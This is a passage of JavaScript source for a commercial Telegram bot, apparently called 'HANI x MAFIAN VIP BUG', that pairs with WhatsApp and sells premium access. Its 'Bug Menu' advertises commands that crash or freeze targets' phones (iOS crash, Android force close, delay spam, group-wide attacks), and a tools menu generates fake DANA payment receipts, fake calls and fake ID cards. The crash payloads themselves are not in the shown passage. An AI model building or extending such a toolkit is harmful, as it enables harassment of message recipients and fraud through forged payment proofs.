  buttons.push([{ text: "✅ I've Joined — Check Again", callback_data: "check_force_join" }]);
  const text = new HTML()
    .heading(1, "🔒 JOIN REQUIRED")
    .paragraph("Please join the required group/channel(s) below before using the bot.")
    .divider()
    .paragraph("After joining, tap <b>I've Joined — Check Again</b>.")
    .build();
  return ctx.sendRichMessage(text, { parse_mode: "HTML", reply_markup: Markup.inlineKeyboard(buttons).reply_markup });
};

bot.command("addforcejoin", checkOwner, async (ctx) => {
  const raw = ctx.message.text.replace(/^\/addforcejoin(?:@\w+)?\s*/i, "").trim();
  const parts = raw.split("|").map(v => v.trim());
  if (parts.length < 2) {
    return ctx.reply("⚠️ Usage:\n/addforcejoin @channel | Channel Name | https://t.me/channel\n\nFor a private group/channel, use its -100... chat ID and invite link.");
  }
  const result = addForceJoin(parts[0], parts[1], parts[2]);
  if (!result.success) return ctx.reply(`❌ ${result.message}`);
  return ctx.reply(`✅ Force join added.\n\n📢 ${result.item.name}\n🆔 ${result.item.chat}\n🔗 ${result.item.link}`);
});

bot.command("delforcejoin", checkOwner, async (ctx) => {
  const index = ctx.message.text.trim().split(/\s+/)[1];
  const removed = removeForceJoin(index);
  if (!removed) return ctx.reply("⚠️ Use /delforcejoin <number>. Check the list with /listforcejoin.");
  return ctx.reply(`🗑 Force join removed: ${removed.name}`);
});

bot.command("listforcejoin", checkOwner, async (ctx) => {
  const list = loadForceJoins();
  if (!list.length) return ctx.reply("📢 No force-join groups or channels have been added.");
  const lines = list.map((item, i) => `${i + 1}. ${item.name}\n   🆔 ${item.chat}\n   🔗 ${item.link}`);
  return ctx.reply(`📢 FORCE JOIN LIST\n\n${lines.join("\n")}`);
});

bot.action("check_force_join", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const required = loadForceJoins();
  const missing = [];
  for (const item of required) {
    if (!(await isMemberOfForceJoin(ctx, item))) missing.push(item);
  }
  if (!missing.length) {
    try { await ctx.deleteMessage(); } catch (_) {}
    return sendStartMenu(ctx);
  }
  return ctx.reply("❌ You have not joined all the required groups/channels yet. Please join them and check again.");
});

// ============ COMMAND START (PV + GROUP SAMA) ============
const sendStartMenu = async (ctx) => {
  await processReferralStart(ctx);
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "Connected" : "Not Connected";

  // ============ CHECK CHAT TYPE ============
  const isPrivate = ctx.chat.type === 'private';
  const DRAFT_ID = 1;

  // Draft animations are optional; never let them block /start or /help.
  if (isPrivate && typeof ctx.sendRichMessageDraft === "function") {
    try {
      await ctx.sendRichMessageDraft(DRAFT_ID, new HTML().thinking(HTML.italic("⚡ Opening menu...")).build());
    } catch (_) {}
  }

  // ============ BUILD RICH MESSAGE (SAMA UNTUK PV & GROUP) ============
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, "𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" + HTML.customEmoji("5316968838691043737", "🕷"))
    .paragraph(
      `𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 MAFIAN, 𝑉𝑣𝑖𝑝 𝑀𝑒𝑛𝑢 𝑂𝑛𝑙𝑦 𝑃𝑟𝑒𝑚𝑖𝑢𝑚 𝑈𝑠𝑒𝑟 𝐶𝑎𝑛 𝑈𝑠𝑒 𝑇ℎ𝑖𝑠 𝐵𝑜𝑡` +
      HTML.customEmoji("5429528223438367408", "👑")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆"],
        ["Version", "27 VVip"],
        ["Status", `${waStatus}`],
        ["Runtine", `${waktuRunPanel}`],
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      `
      If you encounter any bugs or errors, please contact @FG_MAFIAN.
If you have any suggestions or questions, please contact us.. 
      `
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  // ============ SEND RICH MESSAGE ============
  try {
    await ctx.sendRichMessage(msg, {
    protect_content: false, 
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Bug Menu",
          callback_data: "holee",
          style: "primary", 
          icon_custom_emoji_id: "5350759382223186548"
        }
      ], 
      [
        {
          text: "Tools Menu",
          callback_data: "tools",
          style: "primary", 
          icon_custom_emoji_id: "5242284369640441680"
        }
      ], 
      [
        {
          text: "Owner Menu",
          callback_data: "p",
          style: "danger", 
          icon_custom_emoji_id: "5350725709679584478"
        },
        {
          text: "Thanks To",
          callback_data: "tqto",
          style: "danger", 
          icon_custom_emoji_id: "4904687665158292410"
        }
      ],
      [
        {
          text: "Developer Script",
          url: "https://t.me/FG_MAFIAN",
          style: "success", 
          icon_custom_emoji_id: "5350280858441903578"
        }
      ], 
      [
        {
          text: "Channel Developer",
          url: "https://t.me/fgmafian",
          style: "success", 
          icon_custom_emoji_id: "5258513401784573443"
        }
      ]
    ]).reply_markup
    });
  } catch (error) {
    console.error("Rich menu fallback:", error?.message || error);
    await ctx.reply("🕷 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆\n\nMenu temporarily sent in basic mode. Use /help again if needed.", {
      reply_markup: Markup.inlineKeyboard([
        [{ text: "Bug Menu", callback_data: "holee" }, { text: "Tools Menu", callback_data: "tools" }],
        [{ text: "Owner Menu", callback_data: "p" }]
      ]).reply_markup
    });
  }
};

// Hidden owner demo command: send a working menu to a user who has already started the bot.
bot.command("demomenu", ownerOnly, async (ctx) => {
  const targetId = String((ctx.message?.text || "").trim().split(/\s+/)[1] || "");
  if (!/^\d+$/.test(targetId)) return ctx.reply("⚠️ Use: /demomenu userId");
  const registered = broadcastUsers.some((u) => String(u.id || u) === targetId);
  if (!registered) return ctx.reply("❌ User ne pehle bot ke private DM mein /start nahi kiya. Telegram privacy ki wajah se pehle user ko bot start karna hoga.");
  const demoText = "<b>🕷 𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆</b>\n\nOwner demo menu. Neeche buttons se menu open karein:";
  try {
    await bot.telegram.sendMessage(targetId, demoText, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [{ text: "Bug Menu", callback_data: "holee", style: "primary" }],
        [{ text: "Tools Menu", callback_data: "tools", style: "primary" }],
        [{ text: "Owner Menu", callback_data: "p", style: "danger" }, { text: "Thanks To", callback_data: "tqto", style: "danger" }]
      ]).reply_markup
    });
    return ctx.reply(`✅ Demo menu user <code>${targetId}</code> ke DM mein send kar diya.`, { parse_mode: "HTML" });
  } catch (error) {
    console.error("Demo menu delivery failed:", error?.message || error);
    return ctx.reply("❌ Menu send nahi ho saka. User ko bot DM mein /start karne ko kahen.");
  }
});

// Owner demo aliases: the owner can open the full menu from any DM or group.
bot.command("start", sendStartMenu);
bot.command("help", sendStartMenu);
bot.hears(/^\/(?:start|help)(?:@\w+)?$/i, sendStartMenu);
bot.hears(/^\.help(?:@\w+)?$/i, ownerOnly, sendStartMenu);

// Menu SETTING
bot.action("p", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const userId = ctx.from.id.toString();
  const ICON_BACK = "5845943483382110702";
  
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " information setting Menu")
    .table(
      [
        ['Command', 'Example', 'Description'],
['/addadmin', `/addadmin ${userId}`, 'Add admin'],
['/deladmin', `/deladmin ${userId}`, 'Remove admin'],
['/cekprem', '/cekprem', 'Check premium status'],
['/connect', '/connect 234xxx', 'Connect WhatsApp'],
['/resetsession', '/resetsession', 'Reset session'],
['/status', '/status', 'Check bot status'],
['/ref', '/ref', 'Referral link: 7 invites = 15-day Premium'],
['/Refstats', '/Refstats', 'Referral statistics'],
['/Setreflimit', '/Setreflimit 7', 'Set referral invite limit'],
['/listpair', '/listpair', 'Show pairing status'],
['/addbot', '/addbot Bot Name | @username', 'Add a bot to More Bots'],
['/delbot', '/delbot 1', 'Remove a bot from More Bots'],
['/listbots', '/listbots', 'List added bots'],
['/addforcejoin', '/addforcejoin @channel | Name | link', 'Add a required group/channel'],
['/delforcejoin', '/delforcejoin 1', 'Remove a force-join chat'],
['/listforcejoin', '/listforcejoin', 'List required groups/channels']
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer("𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "🤖 More Bots", callback_data: "more_bots", style: "primary" }],
      [{ text: "📢 Force Join", callback_data: "force_join_help", style: "primary" }],
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("force_join_help", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  try { await ctx.deleteMessage(); } catch (_) {}
  const msg = new HTML()
    .heading(1, "📢 FORCE JOIN")
    .divider()
    .paragraph("Owner-only force-join management. Add a public group/channel or a private chat using its -100... ID and invite link.")
    .paragraph("<b>Add:</b> <code>/addforcejoin @channel | Channel Name | https://t.me/channel</code>")
    .paragraph("<b>Private:</b> <code>/addforcejoin -1001234567890 | Private Group | https://t.me/+invite</code>")
    .paragraph("<b>Remove:</b> <code>/delforcejoin 1</code>")
    .paragraph("<b>List:</b> <code>/listforcejoin</code>")
    .divider()
    .paragraph("The bot must be able to access the configured chat so Telegram can verify whether a user has joined.")
    .build();
  return ctx.sendRichMessage(msg, { parse_mode: "HTML", reply_markup: Markup.inlineKeyboard([
    [{ text: "📋 List Force Join", callback_data: "force_join_list", style: "primary" }],
    [{ text: "⬅️ Back", callback_data: "p", style: "danger" }]
  ]).reply_markup });
});

bot.action("force_join_list", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  const list = loadForceJoins();
  if (!list.length) return ctx.reply("📢 No force-join groups or channels have been added.");
  const lines = list.map((item, i) => `${i + 1}. ${item.name}\n   🆔 ${item.chat}\n   🔗 ${item.link}`);
  return ctx.reply(`📢 FORCE JOIN LIST\n\n${lines.join("\n")}`);
});

bot.action("holee", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, HTML.customEmoji("5316968838691043737", "💀") + " BUG MENU")
    .divider()
    .heading(2, HTML.customEmoji("5316968838691043737", "🕷") + " Command Bug")
    .table(
      [
        ["Commands", "Effects"],
        ["/mafian-delay", "Delay Spam"],
        ["/delay-hard", "Delay spam hard"],
        ["/nulldelay", "Delay Hard"],
        ["/blankui", "Blank X delay no click"],
        ["/delayxfreeze", "Delay X Freeze Hard"],
        ["/mafian-fc ", "Andro force close"],
        ["/ios-crash", "iOS crash"],
        ["/mafian-gc", "All group members"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .heading(2, HTML.customEmoji("5253959125838090076", "✅") + " Information Bugs")
    .taskList(
      { text: "Target Auto C1", checked: true },
      { text: "Bug Gacor", checked: true },
      { text: "Bebas Spam", checked: true },
      { text: "Anti Kenon 80%", checked: true }
    )
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tools", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("5231200819986047254", "📊") + " Tools Menu")
    .table(
      [
        ["Command", "Description"],
["/sketch", "Make a Sketch"],
["/fakedana", "Fake DANA"],
["/igc", "iPhone Group"],
["/iqc", "iPhone Quote"],
["/iqcsticker", "iPhone Quote Sticker"],
["/music", "Music Quote"],
["/tanyaustadz", "Ustadz Quote"],
["/threads", "Threads Quote"],
["/winquote", "Windows Quote"],
["/lobbyff", "Fake Free Fire Lobby"],
["/lobbyml", "Fake Mobile Legends Lobby"],
["/storyig", "Instagram Story"],
["/berita", "News Quote"],
["/randompap", "Random Photo"],
["/fakecall", "Fake Call"],
["/idcard", "ID Card"],
["/spotifycard", "Spotify Card"],
["/ttqc", "TikTok Quote"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .footer("𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});

bot.action("tqto", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const ICON_BACK = "5845943483382110702";
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(2, HTML.customEmoji("4915896438879159184", "🤝") + " Credits")
    .paragraph("This project would not be possible without the incredible contributions of the great people below.:")
    .divider()
    .heading(2, HTML.customEmoji("5316740582654112585", "💻") + " Developer Network")
    .table(
      [
        ["NAME", "ROLE"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "DEVELOPER"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "OWNER"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "OWNER"],
        ["HE'S DANIEL", "BROTHER"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "OWNER"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "SUPPORT"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "PATNER"],
        ["𝑭𝑮 𝑴𝑨𝑭𝑰𝑨𝑵", "RESELLER"]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "🤝 Special Thanks",
"Thanks also to all buyers, beta testers, and the community who continue to support the development of this script."
    )
    .divider()
    .footer("𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" + HTML.customEmoji("5352590867947349905", "💋"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "⬅️ Back to Menu", callback_data: "back_to_start", style: "danger" }]
    ]).reply_markup
  });
});
// Tombol Back
bot.action("back_to_start", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  
  try {
    await ctx.deleteMessage();
  } catch (e) {}
  
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
  const waStatus = sock && sock.user ? "Connected" : "Not Connected";
  
  const msg = new HTML()
    .slideshow(
      `<img src="${PHOTOS[0]}"/>`,
      `<img src="${PHOTOS[1]}"/>`,
      `<img src="${PHOTOS[2]}"/>`
    )
    .heading(1, "𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆" + HTML.customEmoji("5316968838691043737", "🕷"))
    .paragraph(
      `𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑡𝑜 MAFIAN, 𝑉𝑣𝑖𝑝 𝑀𝑒𝑛𝑢 𝑂𝑛𝑙𝑦 𝑃𝑟𝑒𝑚𝑖𝑢𝑚 𝑈𝑠𝑒𝑟 𝐶𝑎𝑛 𝑈𝑠𝑒 𝑇ℎ𝑖𝑠 𝐵𝑜𝑡` +
      HTML.customEmoji("5429528223438367408", "👑")
    )
    .divider()
    .heading(2, HTML.customEmoji("5352590867947349905", "💋") + " Bot Information")
    .table(
      [
        ["Information", "Detail"],
        ["Username", `${Name}`],
        ["UserId", `${userId}`],
        ["Name Bot", "𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆"],
        ["Version", "27 VVip"],
        ["Status", `${waStatus}`],
        ["Runtime", `${waktuRunPanel}`]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .details(
      "⚙️ Important Information",
      "If you encounter any problems with bugs or errors, please contact @FG_MAFIAN"
    )
    .blockQuote(HTML.bold("「 ! 」Select Menu Below 「 ! 」"))
    .build();

  await ctx.sendRichMessage(msg, {
    parse_mode: 'HTML',
    reply_markup: Markup.inlineKeyboard([
      [{ text: "🐛 Bug Menu", callback_data: "holee", style: "primary" }],
      [{ text: "🔧 Tools Menu", callback_data: "tools", style: "primary" }],
      [
        { text: "⚙️ Owner Menu", callback_data: "p", style: "danger" },
        { text: "🤝 Thanks To", callback_data: "tqto", style: "danger" }
      ],
      [{ text: "📢 Channel", url: "https://t.me/fgmafian", style: "success" }]
    ]).reply_markup
  });
});


// BATAS MENU SAMA TOOLS
// ==================== GROUP PREMIUM SYSTEM (TELEKAF) ====================

const premiumGroupsFile = "./Database/premiumGroups.json";

// Buat folder jika belum ada
if (!fs.existsSync("./Database")) {
  fs.mkdirSync("./Database", { recursive: true });
}

// ==================== PREMIUM GROUP FUNCTIONS ====================

// Load premium groups
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

// Save premium groups
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}

// Check whether the group is premium
function isGroupPremium(groupId) {
  const groups = loadPremiumGroups();
  return groups.some(item => item.startsWith(groupId.toString() + "|"));
}

// Check expiration and auto-remove
function checkAndCleanExpiredGroups() {
  const groups = loadPremiumGroups();
  let changed = false;
  
  for (const item of groups) {
    const [groupId, expiredTimestamp] = item.split("|");
    if (Date.now() > parseInt(expiredTimestamp)) {
      removeGroupPremium(groupId);
      changed = true;
    }
  }
  
  if (changed) {
    console.log("✅ Expired premium groups cleaned");
  }
}

// Tambah group premium
function addGroupPremium(groupId, days) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (exists) {
    return { success: false, message: "Group is already premium" };
  }
  
  const expiredDate = new Date();
  expiredDate.setDate(expiredDate.getDate() + days);
  const expiredTimestamp = expiredDate.getTime();
  const formattedExpired = expiredDate.toLocaleDateString('id-ID', {
    day: 'numeric',
    month: 'long',
    year: 'numeric'
  });
  
  premiumGroups.push(`${groupId}|${expiredTimestamp}`);
  savePremiumGroups(premiumGroups);
  
  return { 
    success: true, 
    message: `Premium group active for ${days} hari`,
    expired: formattedExpired
  };
}

// Hapus group premium
function removeGroupPremium(groupId) {
  groupId = groupId.toString();
  let premiumGroups = loadPremiumGroups();
  
  const exists = premiumGroups.some(item => item.startsWith(`${groupId}|`));
  if (!exists) return false;
  
  premiumGroups = premiumGroups.filter(item => !item.startsWith(`${groupId}|`));
  savePremiumGroups(premiumGroups);
  return true;
}

// ==================== REFERRAL SYSTEM ====================
const referralFile = "./Database/referrals.json";
const loadReferralState = () => {
  const data = loadJSON(referralFile);
  return data && typeof data === "object" && !Array.isArray(data)
    ? { settings: { limit: 7, rewardDays: 15, ...(data.settings || {}) }, users: data.users || {} }
    : { settings: { limit: 7, rewardDays: 15 }, users: {} };
};
const saveReferralState = (data) => saveJSON(referralFile, data);
const referralCard = (title, body) => new HTML()
  .heading(1, title)
  .divider()
  .paragraph(body)
  .divider()
  .footer("  𝐇𝐀𝐍𝐈  𝐱  𝐌𝐀𝐅𝐈𝐀𝐍 𝐕𝐈𝐏 𝐁𝐔𝐆 ⚡")
  .build();

const processReferralStart = async (ctx) => {
  const text = ctx.message?.text || "";
  const match = text.match(/^\/start(?:@\w+)?\s+ref_(\d+)/i);
  if (!match) return;
  const invitedId = String(ctx.from.id);
  const referrerId = String(match[1]);
  if (invitedId === referrerId) return;
  const state = loadReferralState();
  const invited = state.users[invitedId] || { invites: 0, claimed: false };
  if (invited.claimed || invited.referrer) return;
  invited.referrer = referrerId;
  invited.claimed = true;
  state.users[invitedId] = invited;
  const referrer = state.users[referrerId] || { invites: 0, claimed: false };
  referrer.invites = Number(referrer.invites || 0) + 1;
  state.users[referrerId] = referrer;
  if (referrer.invites >= Number(state.settings.limit || 7)) {
    const expiry = grantTimedPremium(referrerId, Number(state.settings.rewardDays || 15));
    referrer.invites = 0;
    state.users[referrerId] = referrer;
    try {
      await bot.telegram.sendMessage(referrerId, `🎉 Referral target complete!\n✅ ${state.settings.rewardDays} days Premium activated.\n⏰ Expires: ${new Date(expiry).toLocaleString()}`);
    } catch (_) {}
  }
  saveReferralState(state);
};

// Hidden commands: these are intentionally not shown in any menu.
bot.command("ref", async (ctx) => {
  const me = await ctx.telegram.getMe();
  const state = loadReferralState();
  const link = `https://t.me/${me.username}?start=ref_${ctx.from.id}`;
  return ctx.sendRichMessage(referralCard("🎁 REFERRAL PROGRAM", `Invite <b>${state.settings.limit}</b> friends and get <b>${state.settings.rewardDays} days Premium</b> free!\n\n🔗 Your referral link:\n<code>${link}</code>`));
});

bot.command("refstats", async (ctx) => {
  const state = loadReferralState();
  const row = state.users[String(ctx.from.id)] || { invites: 0 };
  return ctx.sendRichMessage(referralCard("📊 REFERRAL STATS", `👤 User: <code>${ctx.from.id}</code>\n✅ Successful invites: <b>${row.invites || 0}</b>\n🎯 Required: <b>${state.settings.limit}</b>\n🎁 Reward: <b>${state.settings.rewardDays} days Premium</b>`));
});

bot.command("setreflimit", checkOwner, async (ctx) => {
  const value = Number((ctx.message.text || "").trim().split(/\s+/)[1]);
  if (!Number.isInteger(value) || value < 1 || value > 1000) return ctx.reply("⚠️ Use: /Setreflimit 7");
  const state = loadReferralState();
  state.settings.limit = value;
  saveReferralState(state);
  return ctx.reply(`✅ Referral limit set to ${value} invites.`);
});

bot.command("listpair", checkOwner, async (ctx) => {
  const pair = lastPairingMessage;
  const body = pair
    ? `📱 Number: <code>${pair.phoneNumber}</code>\\n🔑 Pairing Code: <code>${pair.pairingCode}</code>\\n💬 Chat: <code>${pair.chatId}</code>`
    : "No pairing request is currently stored.";
  return ctx.sendRichMessage(referralCard("🔗 PAIRING STATUS", body));
});

// Case-preserving aliases used by the owner; these are intentionally hidden from menus.
bot.hears(/^\/Refstats(?:@\w+)?$/i, async (ctx) => {
  const state = loadReferralState();
  const row = state.users[String(ctx.from.id)] || { invites: 0 };
  return ctx.sendRichMessage(referralCard("📊 REFERRAL STATS", `👤 User: <code>${ctx.from.id}</code>\\n✅ Successful invites: <b>${row.invites || 0}</b>\\n🎯 Required: <b>${state.settings.limit}</b>\\n🎁 Reward: <b>${state.settings.rewardDays} days Premium</b>`));
});
bot.hears(/^\/Setreflimit(?:@\w+)?\s+(\d+)$/i, async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) return ctx.reply("❌ Only the owner can use this command.");
  const value = Number(ctx.match[1]);
  if (!Number.isInteger(value) || value < 1 || value > 1000) return ctx.reply("⚠️ Use: /Setreflimit 7");
  const state = loadReferralState();
  state.settings.limit = value;
  saveReferralState(state);
  return ctx.reply(`✅ Referral limit set to ${value} invites.`);
});

bot.command('sketch', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const imageUrl = textInput.trim();

    if (!imageUrl) {
        return ctx.reply('Invalid format!\nUse: /sketch [link_gambar]\nContoh:\n/sketch https://example.com/foto.jpg');
    }

    if (!imageUrl.startsWith('http://') && !imageUrl.startsWith('https://')) {
        return ctx.reply('Input must be a valid image URL! (It must start with http:// or https://)');
    }

    await ctx.reply('Processing the image from the link into a sketch, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/image2sketch?url=${encodeURIComponent(imageUrl)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Successfully Converted to Sketch from Link!*',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred or the API server is down.');
    }
});

bot.command('fakedana', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const amount = textInput.trim();

    if (!amount) {
        return ctx.reply('Invalid format!\nUse: /fakedana [amount]\n\nContoh:\n/fakedana 50000');
    }

    if (isNaN(amount)) {
        return ctx.reply('The amount must be a number only without a period/comma! (Example: 100000)');
    }

    await ctx.reply('Processing prank image, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/fakedana?amount=${encodeURIComponent(amount)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated Fake DANA\nAmount: Rp ${parseInt(amount).toLocaleString('id-ID')}\nUse responsibly for harmless jokes!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while retrieving data from the API.');
    }
});

bot.command('iqcsticker', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nUse: /iqcsticker link_pp | chat text\n\nContoh:\n/iqc_sticker https://example.com/pp.jpg | Info crash wa hari ini');
    }

    const [urlProfil, textChat] = textInput.split('|');

    if (!urlProfil || !textChat) {
        return ctx.reply('All fields are required! Make sure to use the | separator correctly.');
    }

    const linkProfil = urlProfil.trim();
    
    if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
        return ctx.reply('The first parameter must be a valid profile photo URL!');
    }

    await ctx.reply('Processing, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/iqc-sticker?text=${encodeURIComponent(textChat.trim())}&img=${encodeURIComponent(linkProfil)}`;
        
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: `Successfully generated iPhone Quote Sticker!`,
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the image through the API.');
    }
});

bot.command('iqc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');
    const quoteText = textInput.trim();

    if (!quoteText) {
        return ctx.reply('Invalid format!\nUse: /iqc [teks]\n\nContoh:\n/iqc Jangan lupa upgrade ke VIP Empire!');
    }

    await ctx.reply('Generating iPhone Quote Chat, please wait...');

    try {
        const apiUrl = `https://api.azbry.com/api/maker/iqc?text=${encodeURIComponent(quoteText)}`;
       
        // Download ke Buffer
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data, 'utf-8');

        await ctx.replyWithPhoto({ source: buffer }, {
            caption: 'Successfully generated iPhone Quote Chat!',
            parse_mode: 'Markdown',
            reply_to_message_id: ctx.message.message_id
        });
    } catch (error) {
        console.error(error);
        ctx.reply('An error occurred while processing the image through the API.');
    }
});


bot.command('igc', async (ctx) => {
    const textInput = ctx.message.text.split(' ').slice(1).join(' ');

    if (!textInput) {
        return ctx.reply('Invalid format!\nUse: /igc link_foto | group name | participant count\n\nContoh:\n/igc https://example.com/pp.jpg | Xylent Empire | 2,500 Peserta');
    }

    const [urlProfil, namaGroup, jumlahPeserta] = textInput.split('|');
    
    if (!urlProfil || !namaGroup || !jumlahPeserta) {
        return ctx.reply('All fields must be filled in! Make sure to use the | separator correctly.');
    }
    
    const linkProfil = urlProfil.trim();
    if (!linkProfil.startsWith('http://') && !linkProfil.startsWith('https://')) {
        return ctx.reply('The first parameter must be a valid profile photo URL (starting with http/https)!');
    }

    await ctx.reply('Processing tampilan iPhone Group Chat, please wait...');

    try {
